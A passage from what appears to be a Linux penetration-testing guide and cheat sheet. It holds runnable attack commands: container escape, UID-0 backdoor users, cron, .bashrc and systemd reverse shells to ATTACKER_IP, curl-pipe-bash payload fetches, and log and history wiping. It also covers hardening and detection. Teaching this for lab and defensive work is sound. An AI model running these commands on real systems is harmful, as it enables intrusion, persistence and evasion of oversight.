# If in docker group on host:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Mounts entire host filesystem → root on host!

# If ALREADY inside a container:
# Check for privileged mode:
cat /proc/1/status | grep CapEff
# If CapEff: 0000003fffffffff = privileged container

# Privileged container escape:
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output    # Running on HOST!
```

> **Pro Hacker Tip 🔥:** When you get a low-privilege shell, run LinPEAS immediately and save the output. Then work through it systematically starting with the RED findings. Don't randomly try exploits — be methodical. 90% of real-world privesc is sudo misconfig, SUID abuse, or writable cron scripts.

### How to Practice This Section:
- [ ] Set up VulnHub machines (BeepBox, DC series, Basic Pentesting) and practice full privesc
- [ ] Do the "Linux PrivEsc" room on TryHackMe
- [ ] Practice each technique on Metasploitable 2 and 3
- [ ] Use GTFOBins to practice every SUID and sudo bypass
- [ ] Run LinPEAS on your Kali VM and understand every output line

---

# 11. Persistence Techniques on Linux

> **Getting access is only half the battle. Maintaining it is the other half. As a red teamer, you need to set up persistence before the blue team detects and kicks you out.**

## 11.1 Adding Backdoor Users

```bash
# Method 1: Standard backdoor user
useradd -m -s /bin/bash backdoor
echo "backdoor:password123" | chpasswd
usermod -aG sudo backdoor    # Add to sudo group

# Method 2: Ghost root user (UID 0)
echo 'ghost:x:0:0::/root:/bin/bash' >> /etc/passwd
echo 'ghost:$6$hash:18000:0:99999:7:::' >> /etc/shadow
# User "ghost" IS root!

# Method 3: Direct /etc/passwd password (if shadow is not used)
openssl passwd -1 backdoorpassword
echo 'backdoor:HASH:0:0::/root:/bin/bash' >> /etc/passwd
```

---

## 11.2 SSH Key Persistence

```bash
# Most reliable persistence method! SSH keys survive password changes.

# Step 1: Generate key pair on your attack machine
ssh-keygen -t rsa -b 4096 -f backdoor_key -N ""
# Creates: backdoor_key (private) and backdoor_key.pub (public)

# Step 2: Add public key to target
mkdir -p /root/.ssh
echo "ssh-rsa AAAA...yourpublickey..." >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# Step 3: Connect silently
ssh -i backdoor_key root@target     # No password needed!

# Stealthy: Append to existing authorized_keys
cat backdoor_key.pub >> /home/user/.ssh/authorized_keys
```

---

## 11.3 Cron Job Backdoors

```bash
# Reverse shell every minute:
(crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1") | crontab -

# System-wide (needs root):
echo "* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /etc/crontab

# Hidden cron in /etc/cron.d:
echo "*/5 * * * * root curl http://ATTACKER/shell.sh | bash" > /etc/cron.d/.system_update
```

---

## 11.4 .bashrc and .profile Poisoning

```bash
# Runs every time user opens a bash session:
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> /home/user/.bashrc

# /etc/profile runs for ALL users at login:
echo 'wget -q http://ATTACKER/update -O /tmp/.update && bash /tmp/.update' >> /etc/profile

# .bash_profile runs at interactive login:
echo 'nohup bash -i >& /dev/tcp/ATTACKER/4444 0>&1 &' >> /home/user/.bash_profile
```

---

## 11.5 Systemd Service Persistence

> **Most sophisticated persistence method. Survives reboots and looks like a legitimate service.**

```bash
# Create malicious service file:
cat > /etc/systemd/system/system-update.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# Enable and start:
systemctl enable system-update.service
systemctl start system-update.service

# Now it runs at every boot AND restarts every 60 seconds if killed!
```

---

## 11.6 Rootkits Overview

> **This is for educational understanding — real defenders need to know what rootkits do.**

```
Types of Rootkits:
1. User-space rootkits   → Replace system tools (ls, ps, netstat) to hide themselves
2. Kernel-mode rootkits  → Patch the kernel directly — invisible to OS tools
3. Bootloader rootkits   → Infect bootloader (UEFI/BIOS level)
4. Firmware rootkits     → Live in hardware firmware — survive OS reinstall

Detection:
- Compare installed binaries with known-good hashes
- rkhunter: rkhunter --check
- chkrootkit: chkrootkit
- AIDE (file integrity monitoring)
- Analyze /proc directly (rootkits can't hide from /proc analysis)
```

### How to Practice This Section:
- [ ] Set up a test VM and practice all persistence methods (cron, systemd, SSH keys)
- [ ] Then try to detect your own persistence methods
- [ ] Practice cleaning up persistence (know how to remove what you added)

---

# 12. Log Management & Covering Tracks

> **IMPORTANT: This section exists to help you understand what defenders look for. As a penetration tester, you clean up your test artifacts. As a defender, you protect these files.**

## 12.1 Understanding Key Log Files

```bash
# Authentication events:
/var/log/auth.log       # SSH, sudo, su, PAM authentication
/var/log/secure         # Same on RHEL/CentOS

# What defenders look for in auth.log:
grep "Failed password" /var/log/auth.log   # Brute force
grep "Accepted" /var/log/auth.log          # Successful logins
grep "sudo:" /var/log/auth.log             # Privilege escalation via sudo
grep "COMMAND" /var/log/auth.log           # Commands run via sudo

# System logs:
/var/log/syslog         # General system messages
/var/log/kern.log       # Kernel messages (module loads, etc.)
/var/log/messages       # General messages (RHEL)

# Web server logs:
/var/log/apache2/access.log   # Every HTTP request
/var/log/apache2/error.log    # Errors
/var/log/nginx/access.log
# Format: IP - user [timestamp] "METHOD /path HTTP/1.1" status bytes
```

---

## 12.2 How Attackers Manipulate Logs

> **Understanding this helps defenders know what to protect.**

```bash
# Clear entire log (VERY OBVIOUS — triggers alerts):
echo "" > /var/log/auth.log      # Empty the file (file still exists, size = 0)
cat /dev/null > /var/log/auth.log

# Remove specific lines (surgical — harder to detect):
sed -i '/192.168.1.50/d' /var/log/auth.log    # Remove lines with attacker's IP
sed -i '/Jan 15 03:22/d' /var/log/auth.log    # Remove specific timestamp

# Bash history:
history -c              # Clear command history in current session
unset HISTFILE          # Stop logging history for this session
export HISTSIZE=0       # Set history size to 0
export HISTFILESIZE=0

# At start of session, disable history:
unset HISTFILE; unset HISTSIZE; HISTFILESIZE=0; export HISTSIZE=0

# Editing wtmp/btmp (binary):
# These require special tools as they're binary files
# utmpdump can help analyze: utmpdump /var/log/wtmp
```

---

## 12.3 auditd — The Defender's Eye

```bash
# Install and enable:
apt install auditd
systemctl enable auditd
systemctl start auditd

# Audit rules (add to /etc/audit/rules.d/audit.rules):
-w /etc/passwd -p wa -k passwd_changes        # Watch passwd file
-w /etc/shadow -p wa -k shadow_changes        # Watch shadow file
-w /etc/sudoers -p wa -k sudoers_changes
-a always,exit -F arch=b64 -S execve -k commands  # Log ALL commands
-w /bin/bash -p x -k bash_execution

# Viewing audit logs:
ausearch -k passwd_changes                    # Search by key
ausearch -x /bin/bash                         # Search by executable
aureport --auth                               # Authentication report
aureport --exec                               # Execution report
```

---

# 13. Linux Hardening (CISO-Level Defense)

> **As a CISO, you're responsible for securing systems. Know how to harden Linux so you understand what attackers are up against — and what your team must implement.**

## 13.1 CIS Benchmark Basics

```bash
# CIS (Center for Internet Security) publishes hardening guides
# Download at: cisecurity.org
# Key areas covered:
# 1. Filesystem Configuration
# 2. Software Updates
# 3. Secure Boot Settings
# 4. Additional Process Hardening
# 5. Mandatory Access Control
# 6. Network Configuration
# 7. Auditing and Logging
# 8. System Access, Authentication and Authorization
```

---

## 13.2 Basic Hardening Steps

### Disable Unnecessary Services:
```bash
systemctl list-units --type=service --state=running    # Running services
systemctl disable bluetooth.service      # Disable Bluetooth
systemctl disable cups.service           # Disable printing
systemctl stop apache2                   # Stop web server if not needed
systemctl mask telnet.service            # Prevent service from starting (even manually)
```

### SSH Hardening:
```bash
# Edit /etc/ssh/sshd_config:

PermitRootLogin no               # Never allow root to SSH in!
PasswordAuthentication no        # Force key-based auth only!
Port 2222                        # Non-standard port (minor obscurity)
MaxAuthTries 3                   # Limit auth attempts
AllowUsers john mary             # Whitelist specific users
Protocol 2                       # SSHv2 only
X11Forwarding no                 # Disable X11 forwarding
PermitEmptyPasswords no
ClientAliveInterval 300          # Disconnect idle sessions after 5 min
ClientAliveCountMax 2

# After editing:
systemctl restart sshd
```

### Fail2ban — Automatic IP Blocking:
```bash
apt install fail2ban
cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
# Edit jail.local:
# [sshd]
# enabled = true
# maxretry = 3
# bantime = 3600
# findtime = 600

systemctl enable fail2ban
systemctl start fail2ban

fail2ban-client status           # Check status
fail2ban-client status sshd      # Check SSH jail
fail2ban-client unban 1.2.3.4    # Unban an IP
```

### UFW Firewall Setup:
```bash
ufw default deny incoming         # Block all incoming by default
ufw default allow outgoing        # Allow all outgoing
ufw allow 22/tcp                  # Allow SSH
ufw allow from 192.168.1.0/24 to any port 22  # SSH only from local network
ufw enable
ufw status verbose
```

---

## 13.3 SELinux and AppArmor

### AppArmor (Ubuntu/Debian default):
```bash
apparmor_status                    # Check status
aa-status                          # Alternative
aa-enforce /etc/apparmor.d/*       # Put all profiles in enforce mode
aa-complain /etc/apparmor.d/usr.bin.firefox  # Complain mode (log but don't block)

# AppArmor confines programs to a defined set of files and capabilities
# Even if attacker compromises nginx, AppArmor prevents them from reading /etc/shadow
```

### SELinux (RHEL/CentOS):
```bash
getenforce                         # Check mode (Enforcing/Permissive/Disabled)
setenforce 1                       # Enable enforcement
sestatus                           # Detailed status
# Set in /etc/selinux/config: SELINUX=enforcing
```

---

## 13.4 File Integrity Monitoring

### AIDE (Advanced Intrusion Detection Environment):
```bash
apt install aide
aideinit                           # Initialize database
aide --check                       # Check for changes (compare to database)
# Run aide --check in cron job daily!

# What AIDE monitors:
# File permissions, owner, group
# File content hash (SHA256)
# File timestamps
# If attacker modifies /bin/ls → AIDE alerts!
```

---

# 14. Essential Hacking Tools Built into Linux

## 14.1 Netcat (nc) — Full Usage Guide

```bash
# Already covered in networking section. Additional uses:

# Chat between two machines:
# Machine 1: nc -lvnp 1234
# Machine 2: nc -nv MACHINE1_IP 1234
# Type messages and hit Enter!

# Port relay/pivot:
mkfifo /tmp/pipe
nc -lvnp 8080 < /tmp/pipe | nc INTERNAL_HOST 80 > /tmp/pipe
# Relay traffic from attacker (port 8080) to internal host port 80

# Web server with nc:
while true; do
    echo -e "HTTP/1.1 200 OK\n\n$(cat /etc/passwd)" | nc -lvnp 80 -q 1
done
```

---

## 14.2 Nmap — The Network Scanner

```bash
# Basic scans:
nmap 10.0.0.1                      # Default scan (top 1000 ports)
nmap -sV 10.0.0.1                  # Version detection
nmap -sC 10.0.0.1                  # Default scripts
nmap -sV -sC -p- 10.0.0.1         # All ports + version + scripts
nmap -A 10.0.0.1                   # Aggressive (OS, version, scripts, traceroute)

# Scan types:
nmap -sS 10.0.0.1                  # SYN scan (stealth, default)
nmap -sT 10.0.0.1                  # TCP connect (full connection)
nmap -sU 10.0.0.1                  # UDP scan (slow but important!)
nmap -sN 10.0.0.1                  # Null scan (firewall bypass)
nmap -sF 10.0.0.1                  # FIN scan (firewall bypass)
nmap -sX 10.0.0.1                  # Xmas scan (firewall bypass)

# Speed and timing:
nmap -T4 10.0.0.1                  # Fast (T0=slowest, T5=fastest)
nmap -T1 --reason 10.0.0.1        # Slow/stealthy scan

# Output:
nmap -oN output.txt 10.0.0.1      # Normal output
nmap -oX output.xml 10.0.0.1      # XML output
nmap -oG output.gnmap 10.0.0.1    # Greppable output
nmap -oA output 10.0.0.1          # All formats simultaneously

# NSE Scripts:
nmap --script=default 10.0.0.1
nmap --script=vuln 10.0.0.1       # Vulnerability scanning!
nmap --script=smb-vuln-ms17-010   # Check for EternalBlue
nmap --script=http-shellshock --script-args uri=/cgi-bin/test.cgi 10.0.0.1
nmap --script=ftp-anon 10.0.0.1   # Check for anonymous FTP
nmap --script=ssh-brute 10.0.0.1  # Brute force SSH (careful!)
```

---

## 14.3 tcpdump — Packet Capture

```bash
tcpdump -i eth0                         # Capture on eth0
tcpdump -i any                          # All interfaces
tcpdump -i eth0 -w capture.pcap         # Save to file
tcpdump -r capture.pcap                 # Read saved capture

# Filters:
tcpdump -i eth0 host 10.0.0.1           # Traffic to/from specific host
tcpdump -i eth0 port 80                 # HTTP traffic
tcpdump -i eth0 port 80 or port 443     # HTTP + HTTPS
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'  # SYN packets only
tcpdump -i eth0 not port 22             # Exclude SSH

# Capture HTTP POST data (credentials!):
tcpdump -i eth0 -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'

# Handy options:
# -n = no DNS resolution (faster)
# -v/-vv/-vvv = verbosity
# -c 100 = capture only 100 packets
# -A = print in ASCII (great for HTTP)
# -X = print in hex + ASCII
```

---

## 14.4 Hydra — Password Brute Forcing

```bash
# SSH brute force:
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1
hydra -L users.txt -P passwords.txt ssh://10.0.0.1

# FTP brute force:
hydra -l admin -P rockyou.txt ftp://10.0.0.1

# HTTP form brute force:
hydra -l admin -P rockyou.txt 10.0.0.1 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"

# Options:
# -l = single username
# -L = username file
# -p = single password
# -P = password file
# -t 4 = 4 threads
# -vV = verbose
# -f = stop when found
```

---

## 14.5 John the Ripper & Hashcat

```bash
# John the Ripper:
john hashes.txt                           # Auto-detect and crack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt                    # Show cracked passwords
john --format=sha512crypt hashes.txt      # Specify hash type

# Hashcat:
hashcat -m 0 hash.txt rockyou.txt         # MD5
hashcat -m 1000 hash.txt rockyou.txt      # NTLM (Windows)
hashcat -m 1800 hash.txt rockyou.txt      # sha512crypt (Linux /etc/shadow)
hashcat -m 1800 hash.txt rockyou.txt -r rules/best64.rule  # With rules
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a  # Brute force 6 chars any

# Hash types cheatsheet:
# 0     = MD5
# 100   = SHA1
# 1400  = SHA256
# 1700  = SHA512
# 1000  = NTLM
# 1800  = sha512crypt ($6$)
# 500   = md5crypt ($1$)
# 3200  = bcrypt ($2y$)
```

---

## 14.6 Web Directory Fuzzing

```bash
# Gobuster:
gobuster dir -u http://10.0.0.1 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://10.0.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
gobuster dns -d example.com -w subdomains.txt   # Subdomain enumeration

# ffuf (faster and more flexible):
ffuf -u http://10.0.0.1/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://10.0.0.1/FUZZ -w wordlist.txt -e .php,.html,.txt
ffuf -u http://10.0.0.1/ -H "Host: FUZZ.example.com" -w subdomains.txt  # VHost fuzzing
ffuf -u http://10.0.0.1/login.php -X POST -d "user=FUZZ&pass=FUZZ2" -w users.txt:FUZZ -w pass.txt:FUZZ2

# dirb:
dirb http://10.0.0.1 /usr/share/wordlists/dirb/common.txt
```

---

# 15. CTF-Specific Linux Skills

## 15.1 File Analysis

```bash
file suspicious_file              # Determine file type (magic bytes, not extension!)
strings suspicious_file           # Extract printable strings (find flags, URLs, passwords!)
strings -n 8 suspicious_file      # Minimum length 8 characters
xxd suspicious_file               # Hex dump
xxd suspicious_file | head -20    # First 20 lines of hex dump
hexdump -C suspicious_file        # Alternative hex dump

binwalk suspicious_file           # Find embedded files in binary
binwalk -e suspicious_file        # EXTRACT embedded files
binwalk --dd='.*' suspicious_file # Extract everything

# File carving:
foremost -t all suspicious_file   # Carve files by header/footer
```

---

## 15.2 Steganography

```bash
# Image steganography:
steghide info image.jpg            # Check for hidden data
steghide extract -sf image.jpg    # Extract hidden data
steghide extract -sf image.jpg -p "password"  # With password

# stegsolve (Java GUI):
java -jar stegsolve.jar

# zsteg (PNG/BMP):
zsteg image.png
zsteg -a image.png                # All checks

# exiftool — metadata:
exiftool image.jpg                 # All metadata (GPS, camera, etc.)
exiftool -all= image.jpg           # Remove all metadata

# pngcheck:
pngcheck -v image.png              # Verify PNG and chunks
```

---

## 15.3 Forensics

```bash
# Disk image analysis:
fdisk -l disk.img                  # Partition table
mount -o loop,offset=OFFSET disk.img /mnt

# Memory forensics (Volatility):
volatility -f memory.dmp imageinfo           # Identify profile
volatility -f memory.dmp --profile=Win7SP1x64 pslist    # Process list
volatility -f memory.dmp --profile=Win7SP1x64 hashdump  # Extract hashes

# File recovery:
photorec                           # Recover deleted files (GUI/TUI)
testdisk                           # Recover partitions and files

# Log analysis:
journalctl --since "2024-01-15"    # systemd logs from date
```

---

## 15.4 Reverse Engineering Basics

```bash
# Static analysis:
file binary                        # File type
strings binary                     # Printable strings
objdump -d binary                  # Disassemble
readelf -a binary                  # ELF headers
nm binary                          # Symbol table
ltrace ./binary                    # Library calls
strace ./binary                    # System calls (reveals what it DOES!)

# strace is invaluable:
strace ./program                   # Trace ALL syscalls
strace -e trace=open,read,write ./program  # Specific syscalls only

# GDB — GNU Debugger:
gdb ./binary                       # Start debugger
(gdb) run                          # Run program
(gdb) break main                   # Set breakpoint at main
(gdb) info functions               # List functions
(gdb) disassemble main             # Disassemble main function
(gdb) x/20x $rsp                  # Examine stack
(gdb) print $rax                   # Print register value
```

---

# MASTER LINUX HACKER CHEAT SHEET

---

## 1. Essential Navigation & File Commands

| Command | Syntax | What it Does | Hacker Use Case |
|---------|--------|-------------|-----------------|
| `ls` | `ls -lah /path` | List files with details + hidden | Find hidden config files |
| `cd` | `cd -` | Go to previous directory | Quick directory switching |
| `find` | `find / -perm -4000 2>/dev/null` | Find files with criteria | Find SUID files for privesc |
| `grep` | `grep -r "password" /var/www/ 2>/dev/null` | Recursive content search | Credential hunting |
| `cat` | `cat /home/*/.bash_history` | Read file contents | Read all users' command history |
| `strings` | `strings -n 8 binary` | Extract printable strings | Find hidden strings in binaries |
| `file` | `file unknown` | Identify file type | Real file type (ignores extension) |
| `xxd` | `xxd file \| head` | Hex dump | Analyze binary files |
| `tail -f` | `tail -f /var/log/auth.log` | Follow log in real-time | Monitor logins live |
| `tee` | `nmap ... \| tee scan.txt` | Write AND display | Save output while watching it |

---

## 2. Permission & Ownership Commands

| Command | Syntax | What it Does | Hacker Use Case |
|---------|--------|-------------|-----------------|
| `chmod` | `chmod 4755 file` | Set SUID + rwxr-xr-x | Create backdoor SUID binary |
| `chmod` | `chmod +x exploit.sh` | Make executable | Run your exploits |
| `chown` | `chown root:root backdoor` | Change ownership | Make backdoor look legit |
| `find SUID` | `find / -user root -perm -4000 2>/dev/null` | Find root SUID files | Privilege escalation vectors |
| `find write` | `find / -writable -type d 2>/dev/null` | Find writable dirs | Drop payloads |
| `ls -la` | `ls -la /etc/crontab` | Check file permissions | Verify if target file is writable |
| `stat` | `stat /bin/bash` | Detailed file info | Check SUID bit, timestamps |

---

## 3. User Management Commands

| Command | Syntax | What it Does | Hacker Use Case |
|---------|--------|-------------|-----------------|
| `id` | `id` | Current user info | Confirm who you are post-exploit |
| `sudo -l` | `sudo -l` | List sudo privileges | PRIMARY privesc check |
| `cat passwd` | `cat /etc/passwd` | User database | Enumerate users, find shells |
| `cat shadow` | `sudo cat /etc/shadow` | Password hashes | Crack offline |
| `useradd` | `useradd -m -s /bin/bash -u 0 backdoor` | Create UID 0 user | Root backdoor user |
| `usermod` | `usermod -aG sudo user` | Modify user | Add yourself to sudo group |
| `su` | `su -` | Switch to root | Full root environment |
| `passwd` | `echo "user:pass" \| chpasswd` | Set password | Backdoor user setup |

---

## 4. Process & Job Control

| Command | Syntax | What it Does | Hacker Use Case |
|---------|--------|-------------|-----------------|
| `ps aux` | `ps aux \| grep root` | List root processes | Find privileged processes |
| `pgrep` | `pgrep -u root` | Find PIDs by criteria | Find root process PIDs |
| `kill -9` | `kill -9 PID` | Force kill | Kill AV/IDS process |
| `crontab` | `crontab -l` | List cron jobs | Check for privesc/persistence |
| `nohup` | `nohup ./backdoor &` | Run detached | Persistent background process |
| `jobs` | `jobs` | List background jobs | Manage running exploits |
| `fg/bg` | `fg %1` | Foreground/background | Manage tool execution |
| `watch` | `watch -n 1 "ps aux"` | Repeat command | Monitor process changes |

---

## 5. Networking Commands

| Command | Syntax | What it Does | Hacker Use Case |
|---------|--------|-------------|-----------------|
| `ip addr` | `ip addr show` | Show interfaces + IPs | Identify network interfaces |
| `ip route` | `ip route show` | Routing table | Map network topology |
| `ss` | `ss -tulnp` | Open ports + PIDs | Internal service enumeration |
| `netstat` | `netstat -an \| grep ESTABLISHED` | Active connections | Who's connected? |
| `arp` | `ip neigh show` | ARP table | Discover LAN hosts |
| `dig` | `dig axfr domain @ns1` | Zone transfer | Enumerate all DNS records |
| `curl` | `curl -X POST -d "data" URL` | HTTP requests | Manual web app testing |
| `wget` | `wget http://attacker/shell.py` | Download file | Pull exploits to target |
| `nmap` | `nmap -sV -sC -p- target` | Full port scan | Comprehensive host analysis |
| `tcpdump` | `tcpdump -i eth0 -A port 80` | Packet capture | Capture credentials in transit |

---

## 6. SSH & Tunneling

| Command | Syntax | What it Does | Hacker Use Case |
|---------|--------|-------------|-----------------|
| `ssh` | `ssh -i key user@host` | SSH with key | Keyless access post-persistence |
| `ssh-keygen` | `ssh-keygen -t rsa -b 4096` | Generate key pair | Create persistence keys |
| `ssh-copy-id` | `ssh-copy-id user@host` | Install public key | Set up key auth |
| `Local Fwd` | `ssh -L 8080:internal:80 user@pivot` | Port forward | Access internal services |
| `Remote Fwd` | `ssh -R 9090:localhost:4444 user@server` | Reverse tunnel | Bypass firewall |
| `SOCKS` | `ssh -D 9050 user@pivot` | SOCKS proxy | Route ALL traffic through pivot |
| `proxychains` | `proxychains nmap -sT internal` | Proxy tools through SOCKS | Scan internal network |

---

## 7. Finding Files & Sensitive Data

| Command | Syntax | What it Does | Hacker Use Case |
|---------|--------|-------------|-----------------|
| `find SSH keys` | `find / -name "id_rsa" 2>/dev/null` | SSH private keys | Lateral movement |
| `find .env` | `find / -name ".env" 2>/dev/null` | Environment files | API keys, DB passwords |
| `find wp-config` | `find / -name "wp-config.php" 2>/dev/null` | WordPress config | Database credentials |
| `grep creds` | `grep -r "password" /var/www/ 2>/dev/null` | Credential search | Web app credentials |
| `bash history` | `cat /home/*/.bash_history 2>/dev/null` | Command histories | Credentials in commands |
| `locate` | `locate passwd` | Fast file search | Quick file discovery |
| `proc environ` | `cat /proc/PID/environ \| tr '\0' '\n'` | Process env vars | Credentials in environment |

---

## 8. Log Files Quick Reference

| Log File | Path | Contains |
|----------|------|----------|
| Auth log | `/var/log/auth.log` | SSH, sudo, su events |
| Secure | `/var/log/secure` | Auth events (RHEL) |
| Syslog | `/var/log/syslog` | General system events |
| Apache | `/var/log/apache2/access.log` | All HTTP requests |
| Nginx | `/var/log/nginx/access.log` | All HTTP requests |
| Cron | `/var/log/cron` | Scheduled task execution |
| Kernel | `/var/log/kern.log` | Kernel messages |
| MySQL | `/var/log/mysql/error.log` | Database events |
| Login | `last` (reads /var/log/wtmp) | Recent logins |
| Failed | `lastb` (reads /var/log/btmp) | Failed logins |

---

## 9. Privilege Escalation Quick Checklist

```
[ ] sudo -l                              → Sudo misconfigurations
[ ] find / -perm -4000 2>/dev/null       → SUID binaries → GTFOBins
[ ] find / -perm -2000 2>/dev/null       → SGID binaries → GTFOBins
[ ] cat /etc/crontab && ls /etc/cron.d/  → Cron job hijacking
[ ] find / -writable -type f 2>/dev/null → Writable files
[ ] uname -a → searchsploit              → Kernel exploits
[ ] getcap -r / 2>/dev/null              → Linux capabilities
[ ] cat /etc/exports                     → NFS no_root_squash
[ ] env                                  → Credentials in environment
[ ] ls -la /etc/passwd                   → Writable /etc/passwd?
[ ] id | grep docker                     → Docker group escape
[ ] cat /home/*/.bash_history            → Credentials in history
[ ] find / -name "*.conf" | xargs grep -l "pass"  → Config credentials
[ ] Run LinPEAS!                         → Automated enumeration
```

---

## 10. Persistence Techniques Quick Reference

| Technique | Command | Stealth |
|-----------|---------|---------|
| Cron reverse shell | `(crontab -l; echo "* * * * * bash -i >& /dev/tcp/IP/PORT 0>&1") \| crontab -` | Medium |
| SSH key | `echo "PUBKEY" >> /root/.ssh/authorized_keys` | High |
| Backdoor user | `useradd -m -u 0 -g 0 ghost` | Low |
| .bashrc | `echo 'bash -i >& /dev/tcp/IP/PORT 0>&1 &' >> ~/.bashrc` | Medium |
| Systemd service | `systemctl enable malicious.service` | High |
| /etc/profile | Append reverse shell | Medium |
| SUID bash | `cp /bin/bash /tmp/.b && chmod +s /tmp/.b` | Medium |

---

## 11. Bash One-Liners for Hackers

```bash
# Live host discovery:
for i in {1..254}; do ping -c1 -W1 192.168.1.$i &>/dev/null && echo "192.168.1.$i UP"; done &

# Port scanner (no tools):
for p in {1..1024}; do (echo>/dev/tcp/TARGET/$p)2>/dev/null && echo "Port $p open"; done

# Extract IPs from file:
grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' file.txt

# Top brute-force source IPs from auth.log:
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head

# Find and grep all config files:
find / -name "*.conf" 2>/dev/null | xargs grep -il "password" 2>/dev/null

# Upgrade shell to full TTY:
python3 -c 'import pty;pty.spawn("/bin/bash")'  # Then CTRL+Z, stty raw -echo, fg

# All users with bash shell:
cat /etc/passwd | awk -F: '$7 ~ /bash/ {print $1}'

# Quick web server:
python3 -m http.server 8080

# Base64 decode:
echo "BASE64STRING" | base64 -d

# Monitor for new SUID files:
watch -n 5 "find / -perm -4000 2>/dev/null"
```

---

## 12. Must-Know File Paths for Hackers

| Path | Contents | Why Hackers Care |
|------|----------|-----------------|
| `/etc/passwd` | User accounts | Enumerate users |
| `/etc/shadow` | Password hashes | Crack passwords |
| `/etc/sudoers` | Sudo rules | Privesc paths |
| `/etc/crontab` | System cron jobs | Cron hijacking |
| `/root/.ssh/` | Root's SSH keys | Direct root access |
| `/home/*/.ssh/id_rsa` | User SSH keys | Lateral movement |
| `/home/*/.bash_history` | Command history | Credentials in commands |
| `/var/log/auth.log` | Auth events | Understand system activity |
| `/tmp/` | Temp files (world-writable) | Drop and execute payloads |
| `/proc/[PID]/environ` | Process env vars | Credentials in memory |
| `/proc/[PID]/cmdline` | Process command line | Passwords in arguments |
| `/var/www/html/` | Web root | Web app source code |
| `/etc/hosts` | Host → IP map | Modify for CTFs |
| `/etc/exports` | NFS shares | NFS exploitation |
| `/etc/fstab` | Mount points | Find network shares |
| `/var/backups/` | Backup files | Old passwords, configs |
| `/opt/` | Custom software | Third-party misconfigs |
| `/srv/` | Service data | Web/FTP content |

---

# World's Best Resources

## 📚 Books (Must-Read):

1. **"The Linux Command Line" by William Shotts**
   - Best book for Linux fundamentals
   - Free online: linuxcommand.org

2. **"Linux Basics for Hackers" by OccupyTheWeb**
   - Specifically written for hackers
   - Perfect companion to this guide

3. **"The Hacker Playbook 3" by Peter Kim**
   - Real-world penetration testing scenarios
   - Linux-heavy throughout

4. **"Penetration Testing" by Georgia Weidman**
   - The classic pentest bible
   - Thorough Linux coverage

5. **"Unix and Linux System Administration Handbook"**
   - The definitive reference for Linux sysadmin
   - Essential for CISO-level understanding

---

## 🌐 Online Learning Platforms:

1. **TryHackMe (tryhackme.com)**
   - Best for beginners
   - Guided learning paths
   - "Linux Fundamentals" and "Linux PrivEsc" paths are essential

2. **Hack The Box (hackthebox.com)**
   - Industry standard
   - Real challenge machines
   - Excellent Academy for structured learning

3. **OverTheWire (overthewire.org)**
   - Wargames that teach Linux through challenges
   - Start with "Bandit" — perfect for command line mastery

4. **PentesterLab (pentesterlab.com)**
   - Excellent web + Linux labs
   - Great for understanding vulnerabilities in context

5. **VulnHub (vulnhub.com)**
   - Free downloadable vulnerable VMs
   - Practice full attack chains locally

---

## 🎥 YouTube Channels:

1. **IppSec** (youtube.com/c/ippsec)
   - HTB machine walkthroughs
   - Best resource for learning real techniques

2. **LiveOverflow** (liveoverflow.com)
   - Deep technical content
   - Binary exploitation, CTFs

3. **John Hammond** (youtube.com/c/JohnHammond010)
   - CTF walkthroughs, malware analysis
   - Great teaching style

4. **NetworkChuck** (youtube.com/c/NetworkChuck)
   - Linux fundamentals, networking
   - Very approachable for beginners

5. **TCM Security** (youtube.com/c/TCMSecurityAcademy)
   - Practical ethical hacking
   - Excellent Linux and networking content

---

## 🛠️ Essential Practice Resources:

1. **GTFOBins** (gtfobins.github.io)
   - The bible for SUID, sudo, and capability abuse
   - Bookmark this immediately

2. **HackTricks** (book.hacktricks.xyz)
   - Comprehensive hacking knowledge base
   - Excellent Linux privesc section

3. **PayloadsAllTheThings** (github.com/swisskyrepo/PayloadsAllTheThings)
   - Every payload you'll ever need
   - Shell commands, reverse shells, privilege escalation

4. **PEASS-ng/LinPEAS** (github.com/carlospolop/PEASS-ng)
   - Best privilege escalation tool
   - Study the source code to understand what it checks

5. **ExplainShell** (explainshell.com)
   - Paste any command to get a visual explanation
   - Perfect for understanding complex commands

---

## 📜 Certifications Roadmap (In Order):

1. **CompTIA Linux+** → Prove fundamental Linux skills
2. **eJPT (eLearnSecurity)** → Entry-level practical pentesting
3. **OSCP (Offensive Security)** → The gold standard for ethical hackers
4. **OSEP** → Advanced evasion and post-exploitation
5. **OSED** → Exploit development
6. **CISSP** → Management-level, required for CISO
7. **CISM** → Security management (CISO track)

---

## 🎯 Your 90-Day Linux Mastery Plan:

**Days 1-30 (Foundation):**
